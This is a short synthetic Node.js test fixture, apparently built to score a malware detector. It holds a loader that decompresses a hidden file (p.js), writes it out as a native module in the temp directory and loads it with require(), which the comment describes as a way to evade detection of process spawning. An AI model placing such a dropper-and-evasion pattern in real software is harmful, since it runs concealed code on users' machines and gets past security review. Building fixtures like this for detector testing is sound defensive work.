// SYNTHETIC FIXTURE — inert loader body. Scored as text, never executed. Evasion
// closure: the materialized file is loaded via native `require(writtenPath)`
// instead of `child_process.spawn` (Spec2).
const fs = require("fs"), path = require("path"), os = require("os"), zlib = require("zlib");
const out = path.join(os.tmpdir(), "m.node");
fs.writeFileSync(out, zlib.gunzipSync(fs.readFileSync(path.join(__dirname, "p.js"))));
require(out);
